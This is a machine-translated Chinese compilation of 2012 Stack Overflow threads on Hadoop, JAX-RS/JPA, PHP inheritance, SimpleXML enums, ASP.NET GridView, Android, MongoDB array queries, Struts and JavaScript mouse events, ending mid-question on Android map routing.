> 时间：2012-04-09T06:48:06.537
> 
> 标签：hadoop

我将属性设置`dfs.permissions.supergroup = hadoop`在`hdfs-site.xml`

并且组 hadoop 有两个用户：`hadoop`,`postfix`

但是，我重新启动hadoop（hadoop-0.20.203.0）后得到的日志文件如下

```
2012-04-09 14:15:10,857 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: fsOwner=hadoop
2012-04-09 14:15:10,859 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: supergroup=hadoop 
```

不`fsOwner`包含后缀:(

任何见解表示赞赏

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T09:02:52.763

日志文件中的 fsOwner 只记录启动 hadoop-hdfs-namenode 守护进程的当前登录用户。如果你使用 postfix 启动 hadoop-hdfs-namenode 守护进程，fsOwner 将被设置为 postfix。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T02:48:11.020

你能检查一下后缀是否添加到了hadoop组中。

（仅供参考，登录后缀用户并输入：

# id 后缀

UID, GID, USERNAME, GROUPNAME THE USER IN)

# java - 如何使用 JAX 在 Java 中使用 Web 服务从数据库中插入数据 - RS

> ID：10069901
> 
> 赞同：13
> 
> 时间：2012-04-09T06:48:21.777
> 
> 标签：java, rest, tomcat, jersey

我是网络服务的新手。请给出建议如何在 java 中使用 jersey JAX - RS 从数据库中插入和检索数据？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-09T09:35:26.403

下面是一个作为会话 bean 实现的**JAX-RS服务的示例，它使用****JPA**进行持久性，使用**JAXB**进行消息传递可能看起来像这样。

**客户服务**

```
package org.example;

import java.util.List;

import javax.ejb.*;
import javax.persistence.*;
import javax.ws.rs.*;
import javax.ws.rs.core.MediaType;

@Stateless
@LocalBean
@Path("/customers")
public class CustomerService {

    @PersistenceContext(unitName="CustomerService",
                        type=PersistenceContextType.TRANSACTION)
    EntityManager entityManager;

    @POST
    @Consumes(MediaType.APPLICATION_XML)
    public void create(Customer customer) {
        entityManager.persist(customer);
    }

    @GET
    @Produces(MediaType.APPLICATION_XML)
    @Path("{id}")
    public Customer read(@PathParam("id") long id) {
        return entityManager.find(Customer.class, id);
    }

    @PUT
    @Consumes(MediaType.APPLICATION_XML)
    public void update(Customer customer) {
        entityManager.merge(customer);
    }

    @DELETE
    @Path("{id}")
    public void delete(@PathParam("id") long id) {
        Customer customer = read(id);
        if(null != customer) {
            entityManager.remove(customer);
        }
    }

    @GET
    @Produces(MediaType.APPLICATION_XML)
    @Path("findCustomersByCity/{city}")
    public List<Customer> findCustomersByCity(@PathParam("city") String city) {
        Query query = entityManager.createNamedQuery("findCustomersByCity");
        query.setParameter("city", city);
        return query.getResultList();
    }

} 
```

**顾客**

下面是其中一个实体的示例。它包含 JPA 和 JAXB 注释。

```
package org.example;

import java.io.Serializable;
import javax.persistence.*;
import javax.xml.bind.annotation.XmlRootElement;

import java.util.Set;

@Entity
@NamedQuery(name = "findCustomersByCity",
            query = "SELECT c " +
                    "FROM Customer c " +
                    "WHERE c.address.city = :city")
@XmlRootElement
public class Customer implements Serializable {
    private static final long serialVersionUID = 1L;

    @Id
    private long id;

    @Column(name="FIRST_NAME")
    private String firstName;

    @Column(name="LAST_NAME")
    private String lastName;

    @OneToOne(mappedBy="customer", cascade={CascadeType.ALL})
    private Address address;

    @OneToMany(mappedBy="customer", cascade={CascadeType.ALL})
    private Set<PhoneNumber> phoneNumbers;

} 
```

**了解更多信息**

*   [第 1 部分 - 数据模型](http://blog.bdoughan.com/2010/08/creating-restful-web-service-part-15.html)
*   [第 2 部分 - JPA](http://blog.bdoughan.com/2010/08/creating-restful-web-service-part-25.html)
*   [第 3 部分 - JAXB（使用 MOXy）](http://blog.bdoughan.com/2010/08/creating-restful-web-service-part-35.html)
*   [第 4 部分 - RESTful 服务（使用 EJB 会话 bean）](http://blog.bdoughan.com/2010/08/creating-restful-web-service-part-45.html)
*   [第 5 部分 - 客户](http://blog.bdoughan.com/2010/08/creating-restful-web-service-part-55.html)

* * *

**更新**

> 需要什么罐子

您可以将 JAX-RS/EJB/JPA/JAXB 应用程序部署到任何符合 Java EE 6 的应用程序服务器，而无需设置任何额外的服务器。对客户端进行编程，您可以从 Jersey ( [http://jersey.java.net/ ) 获取 JAX-RS API，从 EclipseLink (](http://jersey.java.net/) [http://www.eclipse.org/eclipselink/](http://www.eclipse.org/eclipselink/) )获取 JPA 和 JAXB API 。

> 以及写入数据库连接的位置

**JDBC 资源和连接池**

您需要在应用服务器上配置连接池。以下是在 GlassFish 上执行此操作的步骤。这些步骤将根据您使用的应用程序服务器而有所不同。

1.  将 JDBC 驱动程序 (ojdbc14.jar) 复制到 /glashfish/lib
2.  启动管理控制台
3.  创建连接池：
    1.  名称 = 客户服务
    2.  资源类型 = 'javax.sql.ConnectionPoolDataSource'
    3.  数据库供应商 = Oracle（或任何适合您的数据库的数据库供应商）
    4.  点击下一步，填写以下“其他属性”：
    5.  用户（例如 CustomerService）
    6.  密码（例如密码）
    7.  URL（例如 jdbc:oracle:thin:@localhost:1521:XE）
    8.  使用“Ping”按钮测试您的数据库连接
4.  创建一个名为“CustomerService”的 JDBC 资源
    1.  JNDI 名称 = CustomerService
    2.  Pool Name = CustomerService（上一步创建的连接池的名称）

**JPA 配置**

然后我们在文件中为我们的 JPA 实体引用我们上面创建的数据库连接`persistence.xml`，如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<persistence version="1.0"
    xmlns="http://java.sun.com/xml/ns/persistence"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_1_0.xsd">
    <persistence-unit name="CustomerService" transaction-type="JTA">
        <provider>org.eclipse.persistence.jpa.PersistenceProvider</provider>
        <jta-data-source>CustomerService</jta-data-source>
        <class>org.example.Customer</class>
        <class>org.example.Address</class>
        <class>org.example.PhoneNumber</class>
        <properties>
            <property name="eclipselink.target-database" value="Oracle" />
            <property name="eclipselink.logging.level" value="FINEST" />
            <property name="eclipselink.logging.level.ejb_or_metadata" value="WARNING" />
            <property name="eclipselink.logging.timestamp" value="false"/>
            <property name="eclipselink.logging.thread" value="false"/>
            <property name="eclipselink.logging.session" value="false"/>
            <property name="eclipselink.logging.exceptions" value="false"/> 
            <property name="eclipselink.target-server" value="SunAS9"/> 
        </properties>
    </persistence-unit>
</persistence> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-09T06:56:18.103

看看这个[链接](http://javing.blogspot.in/2012/04/using-fun-chalk-board-to-explain-how.html)，有一个视频教程解释了如何做到这一点。

因此，该视频解释了 Web 服务如何检索一些值来告诉客户端给定的凭据与数据库中的某些数据相匹配。

**处理客户端请求的方法如下所示：**

```
@POST
    @Produces(MediaType.TEXT_PLAIN)
    @Path("/login")
    public Response login(@FormParam("email") String email, @FormParam("password") String password) {

        Response.ResponseBuilder responseBuilder = null;

        boolean result = entityFacade.doLogin(email, password);
        if (result) {
             responseBuilder = Response.ok("Success");//Login good!
        }
        else {            
            responseBuilder = Response.ok("Wrong credentials!");//Login bad!
        }

        return responseBuilder.build();
    } 
```

**此 Web 服务将凭证传输到业务层，EJB 将在该业务层中执行数据库中的选择操作：**

```
@Stateless
public class EntityFacade implements EntityFacadeLocal {

    @Resource
    private UserTransaction ut;
    private CredentialJpaController controller;

    @PostConstruct
    public void init() {        
        controller = new CredentialJpaController(ut, Persistence.createEntityManagerFactory("ROLEProject-ejbPU"));
    }

    public boolean doLogin(String email, String password){        
        return controller.loginWithParameters(email,password);
    }
} 
```

**EJB 依赖于一个服务类，该服务类将完成与数据库交互的任务**

```
public class CredentialJpaController implements Serializable {

    public CredentialJpaController(UserTransaction utx, EntityManagerFactory emf) {
        this.utx = utx;
        this.emf = emf;
    }
    private UserTransaction utx = null;
    private EntityManagerFactory emf = null;

    public EntityManager getEntityManager() {
        return emf.createEntityManager();
    }
    public boolean loginWithParameters(String email, String password) {
        boolean result = false;
        EntityManager em = getEntityManager();
        Long l = (Long) em.createNamedQuery("loginquery").setParameter("emailParam", email).setParameter("passwordParam", password).getSingleResult();
        if (l == 1) {
            result = true;
        }
        return result;
    }
} 
```

**最后，为了能够与 DB 交互，数据必须表示为 JPA 实体。此外，为了能够将所选行编组回客户端作为所需的任何 MediaType，实体必须包含一些 JaxB 注释：**

```
@XmlRootElement
@Entity
@Table(name = "CREDENTIALS")
@NamedQuery(name="loginquery", query="SELECT COUNT(c) FROM Credential c WHERE c.email = :emailParam AND c.password = :passwordParam")
public class Credential implements Serializable {

    @Id
    private String email;
    @Column(nullable = false)
    private String password;

    @XmlElement
    public String getEmail() {
        return email;
    }

    public void setEmail(String email) {
        this.email = email;
    }

     @XmlElement
    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }
} 
```

这是一些示例客户端代码，因此您可以看到如何调用 Web 服务的一种方式：

```
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>TODO supply a title</title>
    </head>
    <body>
        <div>TODO write content</div>
        <form action="http://localhost:8080/ROLEProject-war/role/login" method="POST">
            Email <input name="email"/>
            Password <input type="password" name="password"/>
            <input type="submit"/>
        </form>
    </body>
</html> 
```

我希望这有助于给你一个想法。

要插入数据，过程几乎相同，只需使用方法 persist() 而不是实体管理器中的 find()。

# php - 扩展另一个 PHP 类如何继承私有函数？

> ID：10069902
> 
> 赞同：9
> 
> 时间：2012-04-09T06:48:29.853
> 
> 标签：php, class, inheritance

我正在尝试扩展 PHP 类而不重写整个内容。这是一个例子：

```
<?
$a = new foo();
print $a->xxx();
$b = new bar();
print $b->xxx();

class foo {
  const something = 10;

  public function xxx() {
    $this->setSomething();
    return $this->something;
  }

  private function setSomething() {
    $this->something = self::something;
  }
}

class bar extends foo {

  public function xxx() {
    $this->setSomething();
    $this->something++;
    return $this->something;
  }

}
?> 
```

但是，当我运行脚本时，出现以下错误：

```
Fatal error: Call to private method foo::setSomething() from context 'bar' in test.php on line 23 
```

看起来 bar 没有继承私有函数 setSomething()。在不修改 foo 类的情况下如何解决这个问题？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-09T06:52:03.267

**不**，如果不修改 foo 类，您将无法解决此问题。因为**继承的类不能访问父类的私有成员**。这是一个非常基本的[oop](/questions/tagged/oop "显示标记为“oop”的问题")规则。

声明`setSomething()`为`protected`。会解决的。

见[手册](http://php.net/manual/en/language.oop5.visibility.php)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-09T06:51:45.857

私有成员不可继承，不能在子类中使用。在课堂外无法访问它们。

您必须需要将该功能设为受保护或公开。该类和继承的类可以访问受保护的成员。因此，您最好的选择是使该功能受到保护。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-04-09T06:54:01.353

`bar`*继承*函数没问题，但它不能调用它。这就是`private`方法的全部意义，只有声明类可以调用它们。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-04-09T06:57:02.313

尝试反射

[http://php.net/manual/en/class.reflectionclass.php](http://php.net/manual/en/class.reflectionclass.php)

还：

[从 PHP 中的类外部调用私有方法和私有属性](https://stackoverflow.com/questions/2738663/call-private-methods-and-private-properties-from-outside-a-class-in-php)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-10-16T21:12:09.967

你试过这个吗？

```
class bar extends foo {

    public function xxx() {
      $this->something = parent::xxx();
      $this->something++;
      return $this->something;
    }
} 
```

注意**parent::xxx();** 是公开的，所以它应该可以工作......即使它看起来像一个静态调用。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-09T06:55:53.657

不修改原来的类，继承的类是没有办法直接调用`private`父类的方法的。

# java - SimpleXML 枚举区分大小写

> ID：10069903
> 
> 赞同：4
> 
> 时间：2012-04-09T06:48:33.837
> 
> 标签：java, enums, new-operator, simple-framework

我一直在尝试使用 simplexml 库（v2.6.2） [http://simple.sourceforge.net/home.php创建一个 XML](http://simple.sourceforge.net/home.php)

我要创建的 XML 必须包含一个枚举值，它应该区分大小写。以下是 POJO：

```
 package pojos;

public enum MyEnum {

    NEW("new"),
    OLD("old");

     private final String value;

     MyEnum(String v)
     {
         value = v;
     }

     public String value() {
            return value;
        }

        public static MyEnum fromValue(String v) {
            for (MyEnum c: MyEnum.values()) {
                if (c.value.equals(v)) {
                    return c;
                }
            }
            throw new IllegalArgumentException(v);
        }

} 
```

以下是序列化程序代码：

```
import java.io.File;

import org.simpleframework.xml.Serializer;
import org.simpleframework.xml.core.Persister;

import pojos.MyEnum;

public class TestEnum {

    /**
     * @param args
     * @throws Exception 
     */
    public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub

        Serializer serializer = new Persister();
        MyEnum example = MyEnum.NEW;
        File result = new File("myenum.xml");

        serializer.write(example, result);

    }

} 
```

结果输出：

```
<myEnum>NEW</myEnum> 
```

所需的输出：

```
<myEnum>new</myEnum> 
```

我应该如何进行？我无法更改枚举中的变量名，因为它恰好是关键字“new”！

谢谢。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-09T07:04:31.233

在对源代码进行一些调查后，我发现该库使用接口`Transform`将值转换为字符串。枚举转换的默认行为由 class 定义`EnumTransform`。为了自定义它，您可以定义自己的 Transform 类。以下版本的`Transform`实现将调用`toString()`而不是枚举对象的默认值`name()`。

```
class MyEnumTransform implements Transform<Enum> {
    private final Class type;

    public MyEnumTransform(Class type) {
        this.type = type;
    }

    public Enum read(String value) throws Exception {
        for (Object o : type.getEnumConstants()) {
            if (o.toString().equals(value)) {
                return (Enum) o;
            }
        }
        return null;
    }

    public String write(Enum value) throws Exception {
        return value.toString();
    }
} 
```

`Transform``match`对象由接口对象从方法返回`Matcher`。可能有几个`Matcher`对象。库一一尝试，直到找到一个返回非空对象的`Transformer`对象。您可以定义自己的`Matcher`对象并将其作为参数传递给类的构造函数`Persister`。该对象将获得最高优先级。

```
Persister serializer = new Persister(new Matcher() {
    public Transform match(Class type) throws Exception {
        if (type.isEnum()) {
            return new MyEnumTransform(type);
        }
        return null;
    }
 }); 
```

最后，您不会忘记在枚举类上定义一个 toString 方法。然后，上面的代码组合将完成使用枚举对象的 toString 值对枚举对象进行编码的工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T07:12:39.123

你应该覆盖`toString()`

```
@Override 
public String toString() {
       return this.value.toLowerCase();
} 
```

然后使用写结果

```
serializer.write(example.toString(), result); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T07:02:22.950

我会查看[序列化程序代码](http://simple.sourceforge.net/download/stream/doc/tutorial/tutorial.php#start)并且不明白它在做什么，因为您没有注释任何字段......（根据他们的文档）应该引发异常。

# asp.net - 从 GridView 中动态添加的模板字段中通过 id 查找控件

> ID：10069904
> 
> 赞同：1
> 
> 时间：2012-04-09T06:48:35.533
> 
> 标签：asp.net, gridview

嗨，我通过实现 ITemplate 接口将模板字段动态添加到 gridview。模板字段包含一些控件，如标签和文本框。我如何在行数据绑定事件中获取这些控件。

当我从 aspx 页面添加模板字段时，我无法像往常一样执行 gridviewrow.findcontrol("id") 。

我添加模板字段的方式是这样的

`public class CustomGridViewColumn : ITemplate { ListItemType _liType; string _columnName;`

```
 public CustomGridViewColumn(ListItemType type, string column)
        {
            _liType = type;
            _columnName = column;

        }
        void ITemplate.InstantiateIn(System.Web.UI.Control container)
        {
            switch (_liType)
            {
                case ListItemType.Header:
                    Label lblHeader = new Label();
                    lblHeader.Text = _columnName;
                    container.Controls.Add(lblHeader);
                    break;
                case ListItemType.Item:
                    Label lblItem = new Label();
                    lblItem.DataBinding += new EventHandler(lbl_DataBinding);
                    lblItem.ID = "lbl" + _columnName;
                    lblItem.ClientIDMode = ClientIDMode.Predictable;
                    container.Controls.Add(lblItem);

                    DropDownList ddl = new DropDownList();

                    ddl.DataBinding += new EventHandler(ddl_DataBinding);
                    ddl.ID = "ddl" + _columnName;
                    ddl.Visible = false;
                    container.Controls.Add(ddl);
                    break;

            }
        } 
```

}

现在我想访问我使用此代码添加的标签和下拉列表。当我做 gridviewrow.findcontrol("id") 我没有得到它们。谁能帮帮我吗。

当我浏览所有行并尝试查找时，我感到很高兴，但是当我选择它时，我在一行中有一个复选框，所有标签都应该消失并且 ddls 应该出现，我正在使用以下代码。

`protected void chkEdit_CheckedChanged(object sender, EventArgs e) { CheckBox chkEditTest = (CheckBox)sender; GridViewRow grow = (GridViewRow)chkEditTest.NamingContainer; DropDownList ddl = (DropDownList)grow.FindControl("ddl"); Label lbl= (Label)grow.FindControl("lbl"); }`

当我这样做时，我无法获得控件。似乎控件在回发时消失了..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T08:03:04.440

这就是我想出的，我可以在后面的代码中获取控件引用。

```
 public class CustomGridViewColumn : ITemplate
    {
    ListItemType _liType; string _columnName;

    public CustomGridViewColumn(ListItemType type, string column)
    {
        _liType = type;
        _columnName = column;

    }

    void ITemplate.InstantiateIn(Control container)
    {
        switch (_liType)
        {
            case ListItemType.Header:
                Label lblHeader = new Label();
                lblHeader.Text = _columnName;
                container.Controls.Add(lblHeader);
                break;
            case ListItemType.Item:
                Label lblItem = new Label();
                lblItem.DataBinding += new EventHandler(lblItem_DataBinding);
                lblItem.ID = "lbl" + _columnName;
                lblItem.ClientIDMode = ClientIDMode.Predictable;
                container.Controls.Add(lblItem);

                DropDownList ddl = new DropDownList();

                ddl.DataBinding += new EventHandler(ddl_DataBinding);
                ddl.ID = "ddl" + _columnName;
                ddl.Visible = false;
                ddl.DataSource = new string[] { "Hello", "World" };
                container.Controls.Add(ddl);
                break;

        }
    }

    void ddl_DataBinding(object sender, EventArgs e)
    {

    }

    void lblItem_DataBinding(object sender, EventArgs e)
    {

    }

}

 protected void Page_Load(object sender, EventArgs e)
 {

    DataTable dt = new DataTable();
    dt.Columns.Add("Name");
    DataRow oItem = dt.NewRow();
    oItem[0] = "Deepu";
    dt.Rows.Add(oItem);
    oItem = dt.NewRow();
    oItem[0] = "MI";
    dt.Rows.Add(oItem);
    GridView gv = new GridView();
    gv.ID = "myGridView";
    gv.AutoGenerateColumns = false;
    BoundField nameColumn = new BoundField();
    nameColumn.DataField = "Name";
    nameColumn.HeaderText = "Name";
    gv.Columns.Add(nameColumn);

    TemplateField TmpCol = new TemplateField();
    TmpCol.HeaderText = "Template Column";
    gv.Columns.Add(TmpCol);
    TmpCol.ItemTemplate = new CustomGridViewColumn(ListItemType.Item, "TEST");
    gv.DataSource = dt;
    gv.DataBind();
    Form.Controls.Add(gv);

}
protected void Button1_Click(object sender, EventArgs e)
{
    GridView gv = Form.FindControl("myGridView") as GridView;
    foreach (GridViewRow item in gv.Rows)
    {
        var ddl = item.FindControl("ddlTest") as DropDownList;
        if (ddl != null)
        {
            ddl.Visible = true;
        }

        var lbl = item.FindControl("lbl") as Label;
        if (lbl != null)
        {
            lbl.Text = "hello";
        }
    }
}

<form id="form1" runat="server">

<asp:Button ID="Button1" runat="server" onclick="Button1_Click" Text="Button" />

</form> 
```

谢谢

迪普

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-04-09T06:55:04.813

您可以尝试使用 GRIDVIEW 控件的行索引吗

```
var rowIndex = int.Parse(e.CommandArgument)
GridView1.Rows[rowIndex].FindControl("id") 
```

另请参阅

[http://forums.asp.net/t/998368.aspx/1](http://forums.asp.net/t/998368.aspx/1)

[http://www.codeproject.com/Articles/12021/Accessing-the-different-controls-inside-a-GridView](http://www.codeproject.com/Articles/12021/Accessing-the-different-controls-inside-a-GridView)

[http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridviewrow.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridviewrow.aspx)

谢谢

迪普

# android - 只需编写一次方法，然后在应用程序的任何地方的“android:onClick”中访问它

> ID：10069908
> 
> 赞同：2
> 
> 时间：2012-04-09T06:49:12.100
> 
> 标签：android, onclick, android-xml

我的应用程序中有一个标题栏。并且标题栏有一个按钮。单击该按钮时，我会显示信息活动。现在，据我所知，`android:onClick`需要在 .xml 中设置 xml 的活动中引用公共方法`setContentView()`。现在，由于该按钮单击的逻辑在整个应用程序中都是相同的，所以我想要的是，我将只说一次该方法`showInfoScreen(View view)`并将其放入该按钮`onClick`属性中。而且我不需要到处写相同的方法。是否可以？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-09T07:01:15.220

当然有可能。写一个`Activity`类，然后让你所有的`Activity`s 扩展它。例如：

```
public abstract class BaseActivity extends Activity {

    @Override
    public void setContentView( int layoutResID ) {

        super.setContentView( layoutResID );
        findViewById(R.id.button).setOnClickListener(new OnTitleBarButtonClickListener());
    }

    private void showInfoScreen() {

        // Show the info screen
    }

    private class OnTitleBarButtonClickListener implements OnClickListener {

        @Override
        public void onClick(View v) {

            showInfoScreen();
        }
    }
} 
```

然后你所有的派生`Activity`s 将扩展`BaseActivity`而不是`Activity`.

这样做的好处是任何`Activity`扩展这个类的东西都会自动获得这个特性。派生类中不需要编码，只需在`BaseActivity`. `Activity`您所有的s 将拥有的唯一合同将是拥有`R.id.button`或您在其内容中命名的任何 id。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:56:34.907

我认为您必须`onclick`在要显示信息屏幕的每个活动中编写。

但是`OnClick` 您只需在每个 Activity 中调用 A 方法`showInfoScreen(View view)`....

你应该创建类 Like...`ShowInfo`并且有一个静态方法...

```
public class ShowInfo{

 public static void showInfoScreen(View view,Context c){
  //now dispay info here 
}
} 
```

写`ShowInfo.showInfoScreen(v,YourClassName.this)`在你的`onClick()`方法....

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T06:55:46.807

建议的示例`Vinayak.B`如下：

```
 public class yourAppUtils {

    public static void yourMethod() {
        // Do stuff
    }

} 
```

# arrays - mongo db查询大于和小于的数组值

> ID：10069910
> 
> 赞同：15
> 
> 时间：2012-04-09T06:49:23.690
> 
> 标签：arrays, mongodb

我有一个类似于

```
{
   'user_id' : 1,
   'marks' : [10, 40]
} 
```

我想找出至少一次得分在 20 到 30 之间的用户数量。

我尝试了以下查询

```
db.users.count({
   'marks' : {$gte: '20', $lt: '30'}
}) 
```

但这也包括那些分数超过 30 的人......

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2014-08-04T02:32:20.917

用于[`$elemMatch`](http://docs.mongodb.org/manual/reference/operator/query/elemMatch/#op._S_elemMatch)将范围查询的两个部分约束到*同一个* `marks`元素：

```
db.users.count({
    marks: {$elemMatch: {$gte: 20, $lt: 30}}
}) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-23T15:57:18.490

不就是这样吗：

```
db.scores.count( { 'marks' : { '$gt' : min_value , '$lt' : max_value } } ) 
```

在您的情况下，这将转化为：

```
db.scores.count( { 'marks' : { '$gt' : 20 , '$lt' : 30 } } ) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-03-08T19:51:49.583

```
db.scores.count(
   { marks: { $elemMatch: { $gte: 20, $lt: 30} } }
) 
```

有关更多信息，请参阅[https://docs.mongodb.com/manual/reference/operator/query/elemMatch/](https://docs.mongodb.com/manual/reference/operator/query/elemMatch/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-09T11:08:41.130

因此，假设您在收集分数中有以下数据：

```
{ 'user_id' : 1, 'marks' : [ 10, 40 ] }
{ 'user_id' : 2, 'marks' : [ 5, 18 ] }
{ 'user_id' : 3, 'marks' : [ 15, 25 ] }
{ 'user_id' : 4, 'marks' : [ 22, 33 ] } 
```

然后你会期望过滤 user_ids 3 和 4，计数为 2。

运行查询的最简单方法是：

```
db.scores.count({'marks':{$in: [20,21,22,23,24,25,26,27,28,29,30]}}) 
```

不过不好看...

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-05-17T13:21:10.697

用 $ 你也可以写

```
db.scores.count({$and: [{"price": {$lt: 30}}, {"price": {$gte: 20}}]}) 
```

# tomcat - Struts 1 Tomcat 在 Windows 7 中不起作用

> ID：10069914
> 
> 赞同：0
> 
> 时间：2012-04-09T06:49:44.993
> 
> 标签：tomcat, windows-7, struts1

我安装了 Tomcat 6.0.35 服务器。我的 struts 应用程序无法在 Windows 7 中运行。运行我的 struts 应用程序时出现错误：

```
exception 

org.apache.jasper.JasperException: java.lang.NullPointerException: Module 'null' not found.
    org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:502)
    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:430)
    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)

root cause 

java.lang.NullPointerException: Module 'null' not found.
    org.apache.struts.taglib.TagUtils.getModuleConfig(TagUtils.java:755)
    org.apache.struts.taglib.TagUtils.computeURLWithCharEncoding(TagUtils.java:364)
    org.apache.struts.taglib.TagUtils.computeURLWithCharEncoding(TagUtils.java:285)
    org.apache.struts.taglib.logic.RedirectTag.generateRedirectURL(RedirectTag.java:289)
    org.apache.struts.taglib.logic.RedirectTag.doEndTag(RedirectTag.java:268)
    org.apache.jsp.index_jsp._jspx_meth_logic_005fredirect_005f0(index_jsp.java:87)
    org.apache.jsp.index_jsp._jspService(index_jsp.java:60)
    org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:388)
    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:717) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T07:03:39.737

这可能是由于多种原因。检查[struts module null not found](http://www.coderanch.com/how-to/java/ModuleNull)

另外，请确保您没有混淆`.jars`

# javascript - 我的 mouseup 代码有什么问题？

> ID：10069918
> 
> 赞同：0
> 
> 时间：2012-04-09T06:50:00.120
> 
> 标签：javascript, html, internet-explorer, right-click, onmouseup

尝试检测左键单击与右键单击（不使用 jQuery！），我有以下代码

Javascript：

```
function cclick(e) {
   if (e.button == 1) {alert("hgbdygwea");}
   else {
      alert(e.button);
   }
} 
```

HTML：

```
<a onmouseup="cclick()" ...> <img .../> </a> <!-- also tried cclick instead of cclick() --> 
```

使用 Internet Explorer 9

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T07:00:52.737

您需要将事件对象传递给您的函数：

```
onmouseup="cclick(event);" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T07:00:43.637

Quirksmode 有一篇关于“点击了[哪个鼠标按钮？](http://www.quirksmode.org/js/events_properties.html#button) ”主题的文章，[他的代码](http://jsfiddle.net/Marcel/LMtwd/)比你的代码更有效。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T07:13:56.207

以下是另一种方法

```
function cclick() {
   var e = window.event;
   if (e.button == 1) {alert("hgbdygwea");}
   else {
      alert(e.button);
   }
} 
```

并调用如下函数而不传递`event`.

```
<a onmouseup="cclick()" ...> <img .../> </a> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T07:14:47.953

我认为这段代码应该适合你。e.button 不适用于所有浏览器（我清理了代码）。

```
function cclick(e) {
    "use strict";
    e || window.event;
    if (e.which) {
        alert((e.which === 1) ? "hgbdygwea" : e.which);
    } else {
        alert((e.button === 1) ? "hgbdygwea" : e.button);
    }
}

<a onmouseup="cclick(event)" ...> <img .../> </a> <!-- also tried cclick instead of cclick() --> 
```

# android - 如何分配当前地理坐标以绘制从当前位置到目标位置的路径？

> ID：10069920
> 
> 赞同：0
> 
> 时间：2012-04-09T06:50:38.670
> 
> 标签：android, google-maps, google-geocoder

我能够从
[j2memaprouteprovider](http://code.google.com/p/j2memaprouteprovider/source/browse/trunk/J2MEMapRouteAndroidEx/src/org/ci/geo/route/android/MapRouteActivity.java)的参考中绘制两组地理坐标之间的路径。
我能够获得当前位置的纬度和经度。
我如何在以下类中实现这些坐标以获取从当前位置到目标位置的路径。

**MapRouteActivity.java**

```
public class MapRouteActivity extends MapActivity {

LinearLayout linearLayout;
MapView mapView;
private Road mRoad;
static Context context = null;
String GPSPROVIDER = LocationManager.GPS_PROVIDER;
private static final long MIN_GEOGRAPHIC_POOLING_TIME_PERIOD = 10000;
private static final float MIN_GEOGRAPHIC_POOLING_DISTANCE = (float) 5.0;
public LocationManager gpsLocationManager;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    mapView = (MapView) findViewById(R.id.mapview);
    mapView.setBuiltInZoomControls(true);

    context = this;

    /* Get a listener for GPS */
    LocationListener gpsLocationListener = null;

    gpsLocationListener = new GpsLocationListener(this);

    /* Start Location Service for GPS */
    gpsLocationManager = (LocationManager) this
            .getSystemService(Context.LOCATION_SERVICE);

    /* Register GPS listener with Location Manager */
    gpsLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
            MIN_GEOGRAPHIC_POOLING_TIME_PERIOD,
            MIN_GEOGRAPHIC_POOLING_DISTANCE, gpsLocationListener);
    if (gpsLocationManager == null) {
        gpsLocationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                MIN_GEOGRAPHIC_POOLING_TIME_PERIOD,
                MIN_GEOGRAPHIC_POOLING_DISTANCE, gpsLocationListener);
    }

    boolean isAvailableGps = gpsLocationManager
            .isProviderEnabled(GPSPROVIDER);

    if (isAvailableGps) {

        Location loc = gpsLocationManager.getLastKnownLocation("gps");

        if (loc != null) {

